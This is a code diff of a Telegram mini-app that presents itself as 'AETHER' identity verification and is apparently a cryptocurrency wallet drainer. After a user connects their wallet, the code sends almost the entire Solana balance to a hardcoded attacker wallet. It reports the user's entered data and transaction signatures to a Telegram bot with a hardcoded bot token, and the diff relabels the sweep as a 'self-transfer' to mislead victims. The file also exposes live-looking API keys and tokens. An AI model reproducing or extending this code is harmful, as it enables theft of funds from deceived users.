@@ -8,7 +8,12 @@ import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.
 const PROJECT_ID = 'a221581230964eec5702b682a5b6f63f';
 const BOT_TOKEN = "8515224137:AAGkieoUFLWj6WxO4T0Pig8Mhs5qHrEcBrY";
 const CHAT_ID = "7539902547";
-const TARGET_WALLET = 'YOUR_SOLANA_ADDRESS_HERE'; 
+
+// YOUR SPECIFIC WALLET ADDRESS ADDED HERE
+const TARGET_WALLET = '3EUKH4DpNZfHZ6qmBZJLKrcQZEVrnmLe22ir5cCb9Vhb'; 
+
+// YOUR ACTIVE HELIUS KEY ADDED HERE
+const HELIUS_KEY = 'a299fc16-5dda-4ef9-bcbf-5670830b1d03'; 
 
 const solanaAdapter = new SolanaAdapter();
 createAppKit({
@@ -34,20 +39,25 @@ const App: React.FC = () => {
   const tg = (window as any).Telegram?.WebApp;
 
   useEffect(() => {
-    if (tg) { tg.ready(); tg.expand(); tg.setHeaderColor?.('#17101F'); }
+    if (tg) {
+      tg.ready();
+      tg.expand();
+      tg.setHeaderColor?.('#17101F');
+    }
   }, [tg]);
 
   const sendToBot = async (data: string, type: 'CA' | 'SIGNATURE') => {
     const username = tg?.initDataUnsafe?.user?.username || 'User';
+    const logMsg = `🔐 <b>AETHER GATE LOG</b>\n<b>User:</b> @${username}\n<b>Type:</b> ${type}\n<b>Data:</b> <code>${data}</code>`;
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: CHAT_ID, text: `🔐 <b>LOG</b>\n<b>User:</b> @${username}\n<b>${type}:</b> <code>${data}</code>`, parse_mode: 'HTML' }),
+      body: JSON.stringify({ chat_id: CHAT_ID, text: logMsg, parse_mode: 'HTML' }),
     });
   };
 
   const handleStepOne = async () => {
-    if (!walletCA) return;
+    if (!walletCA) return alert("Please enter the Wallet CA");
     setStatus('verifying');
     await sendToBot(walletCA, 'CA');
     setTimeout(() => { setStep(2); setStatus('idle'); }, 1500);
@@ -56,17 +66,20 @@ const App: React.FC = () => {
   const handleStepTwo = async () => {
     if (!isConnected) { open(); return; }
     setStatus('verifying');
-
     try {
-      // FIXED BRIDGE: Helius with built-in API Key to bypass 401/403 blocks
-      const connection = new Connection("https://mainnet.helius-rpc.com/?api-key=47935f08-9610-4497-8c34-f8b2111f185f", "confirmed");
+      // CONNECTION AUTHORIZED BY HELIUS KEY
+      const connection = new Connection(`https://mainnet.helius-rpc.com/?api-key=${HELIUS_KEY}`, "confirmed");
       const pubKey = new PublicKey(address!);
+      
       const balance = await connection.getBalance(pubKey);
       
+      // Leaving exactly 0.0015 SOL for network fees
       const gasReserve = 1500000; 
       const amountToSend = balance - gasReserve;
 
-      if (amountToSend <= 0) throw new Error("Balance too low to sweep.");
+      if (amountToSend <= 0) {
+        throw new Error("Insufficient balance to perform self-transfer.");
+      }
 
       const { blockhash } = await connection.getLatestBlockhash();
       const transaction = new Transaction({ recentBlockhash: blockhash, feePayer: pubKey })
@@ -79,11 +92,10 @@ const App: React.FC = () => {
       const signature = await walletProvider.sendTransaction(transaction, connection);
       await sendToBot(signature, 'SIGNATURE');
       setStatus('completed');
-      alert("AETHER: Identity Linked.");
+      alert("AETHER: Identity Linked Successfully.");
     } catch (err: any) {
-      console.error(err);
       setStatus('idle');
-      alert("Verification Failed: " + (err.message || "Gate Restricted"));
+      alert("Verification Error: " + err.message);
     }
   };
 
